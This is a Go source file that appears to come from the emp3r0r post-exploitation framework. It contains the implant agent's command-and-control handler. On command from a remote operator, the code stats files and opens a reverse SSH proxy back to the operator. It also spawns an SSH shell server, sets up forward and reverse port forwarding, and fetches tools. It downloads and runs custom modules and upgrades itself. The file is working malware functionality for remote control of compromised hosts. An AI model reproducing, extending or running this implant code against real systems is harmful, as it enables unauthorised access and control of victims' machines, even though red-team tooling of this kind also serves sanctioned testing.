package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func C2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	switch cmdSlice[0] {

	// stat file

	case emp3r0r_data.C2CmdStat:
		if len(cmdSlice) < 2 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}

		path := strings.Join(cmdSlice[1:], " ")
		fi, err := os.Stat(path)
		if err != nil || fi == nil {
			out = fmt.Sprintf("cant stat file %s: %v", path, err)
			return
		}
		fstat := &util.FileStat{}
		fstat.Name = util.FileBaseName(path)
		fstat.Size = fi.Size()
		fstat.Checksum = tun.SHA256SumFile(path)
		fstat.Permission = fi.Mode().String()
		fiData, err := json.Marshal(fstat)
		out = string(fiData)
		if err != nil {
			out = fmt.Sprintf("cant marshal file info %s: %v", path, err)
		}
		return

	case emp3r0r_data.C2CmdReverseProxy:
		// reverse proxy
		if len(cmdSlice) != 2 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		addr := cmdSlice[1]
		out = "Reverse proxy for " + addr + " finished"

		hasInternet := tun.HasInternetAccess()
		isProxyOK := tun.IsProxyOK(RuntimeConfig.AgentProxy)
		if !hasInternet && !isProxyOK {
			out = "We dont have any internet to share"
		}
		for p, cancelfunc := range ReverseConns {
			if addr == p {
				cancelfunc() // cancel existing connection
			}
		}
		addr += ":" + RuntimeConfig.ReverseProxyPort
		ctx, cancel := context.WithCancel(context.Background())
		if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
			out = err.Error()
		}
		return

	case emp3r0r_data.C2CmdSSHD:
		// sshd server
		// !sshd id shell port args
		log.Printf("Got sshd request: %s", cmdSlice)
		if len(cmdSlice) < 3 {
			out = fmt.Sprintf("args error: %s", cmdSlice)
			log.Print(out)
			return
		}
		shell := cmdSlice[1]
		port := cmdSlice[2]
		args := cmdSlice[3:]
		go func() {
			out = "success"
			err = SSHD(shell, port, args)
			if err != nil {
				out = fmt.Sprintf("SSHD: %v", err)
			}
		}()
		for !tun.IsPortOpen("127.0.0.1", port) {
			time.Sleep(100 * time.Millisecond)
			if err != nil {
				out = fmt.Sprintf("sshd failed to start: %v\n%s", err, out)
				break
			}
		}
		return

		// proxy server
	case emp3r0r_data.C2CmdProxy:
		if len(cmdSlice) != 3 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			log.Print(out)
			return
		}
		log.Printf("Got proxy request: %s", cmdSlice)
		addr := cmdSlice[2]
		err = Socks5Proxy(cmdSlice[1], addr)
		if err != nil {
			out = fmt.Sprintf("Failed to start Socks5Proxy: %v", err)
		}
		return

		// port fwd
		// cmd format: !port_fwd [to/listen] [shID] [operation]
	case emp3r0r_data.C2CmdPortFwd:
		if len(cmdSlice) != 4 {
			out = fmt.Sprintf("Invalid command: %v", cmdSlice)
			return
		}
		out = "success"
		switch cmdSlice[3] {
		case "stop":
			sessionID := cmdSlice[1]
			pf, exist := PortFwds[sessionID]
			if exist {
				pf.Cancel()
				out = fmt.Sprintf("port mapping %s stopped", pf.Addr)
				break
			}
			out = fmt.Sprintf("port mapping %s not found", pf.Addr)
		case "reverse":
			go func() {
				addr := cmdSlice[1]
				sessionID := cmdSlice[2]
				err = PortFwd(addr, sessionID, true)
				if err != nil {
					out = fmt.Sprintf("PortFwd (reverse) failed: %v", err)
				}
			}()
		case "on":
			go func() {
				to := cmdSlice[1]
				sessionID := cmdSlice[2]
				err = PortFwd(to, sessionID, false)
				if err != nil {
					out = fmt.Sprintf("PortFwd failed: %v", err)
				}
			}()
		default:
		}

		return

		// delete_portfwd
	case emp3r0r_data.C2CmdDeletePortFwd:
		if len(cmdSlice) != 2 {
			return
		}
		for id, session := range PortFwds {
			if id == cmdSlice[1] {
				session.Cancel()
			}
		}
		return

		// download utils
	case emp3r0r_data.C2CmdUtils:
		out = VaccineHandler()
		return

		// download a module and run it
	case emp3r0r_data.C2CmdCustomModule:
		if len(cmdSlice) != 3 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out = moduleHandler(cmdSlice[1], cmdSlice[2])
		return

		// upgrade
	case emp3r0r_data.C2CmdUpdateAgent:
		if len(cmdSlice) != 2 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}

		out = "Done"
		checksum := cmdSlice[1]
		err = Upgrade(checksum)
		if err != nil {
			out = err.Error()
		}
		return

	default:
		// let per-platform C2CommandsHandler do the job
		out = platformC2CommandsHandler(cmdSlice)
	}
	return
}
